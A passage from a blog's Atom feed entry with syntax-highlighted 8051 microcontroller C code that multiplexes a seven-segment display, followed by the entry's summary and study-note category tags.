class="keyword">void</span> <span class="title">delay</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">120</span>;j++);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">seg</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">P3 = ym[i];</span><br><span class="line">P2 = cathode[i];</span><br><span class="line"><span class="built_in">delay</span>(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">seg();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;51单片机入门02–数码管&quot;&gt;&lt;a href=&quot;#51单片机入门02–数码管&quot; class=&quot;headerlink&quot; title=&quot;51单片机入门02–数码管&quot;&gt;&lt;/a&gt;51单片机入门02–数码管&lt;/h2&gt;&lt;h2 id=&quot;实验环境&quot;&gt;&lt;a href=&quot;#实验环境&quot;
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="51单片机学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
</feed>
